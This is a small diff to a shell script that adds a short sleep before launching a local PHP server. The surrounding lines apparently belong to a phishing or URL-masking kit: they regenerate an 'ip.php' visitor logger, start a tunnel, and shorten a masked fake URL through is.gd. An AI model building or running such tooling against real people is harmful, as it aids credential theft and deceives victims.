@@ -113,7 +113,7 @@ fi
 
 cd .server && rm -f ip.php
 make_php "$msk"
-php -S "$host":"$port" > /dev/null 2>&1 &
+sleep 0.75 && php -S "$host":"$port" > /dev/null 2>&1 &
 ini_cloud
 cd "$loc"
 req=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${fkurl})
